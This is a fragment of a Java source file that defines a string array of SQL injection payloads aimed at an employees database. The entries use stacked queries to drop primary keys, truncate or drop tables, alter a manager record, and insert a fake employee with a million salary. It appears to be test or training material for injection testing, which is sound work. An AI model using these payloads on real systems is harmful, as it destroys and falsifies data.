...
//	
	public static String [] injections = 
	{
			...
			"; UPDATE DEPT_MANAGER SET emp_no = 153;--",
			"; ALTER TABLE EMPLOYEES DROP PRIMARY KEY;--",
			"; ALTER TABLE EMPLOYEES DROP PRIMARY KEY;ALTER TABLE TITLES DROP PRIMARY KEY;ALTER TABLE EMPLOYEES DROP PRIMARY KEY;--",
			"; ALTER TABLE EMPLOYEES DROP PRIMARY KEY; TRUNCATE TABLE DEPT_MANAGER; DROP TABLE EMPLOYEES;--",
			"; ALTER TABLE DEPT_MANAGER DROP PRIMARY KEY;TRUNCATE TABLE DEPT_MANAGER;--",
			"; INSERT INTO EMPLOYEES VALUES(153, 10/25/1234, 'WATERS','GENDRY', 'M', 1/15/2315);TRUNCATE TABLE DEPT_MANAGER;--",
			"; INSERT INTO EMPLOYEES VALUES(153, 10/25/1234, 'WATERS','GENDRY', 'M', 1/15/2315);--",
			"; INSERT INTO EMPLOYEES VALUES(153, 10/25/1234, 'BARATHEON','ROBERT', 'M', 1/15/2315); INSERT INTO TITLES VALUES(153, 'THE KING', 3/10/2495, 5/15/2497); INSERT INTO SALARIES VALUES(153, 1000000, 3/10/2495, 5/15/2497);--",
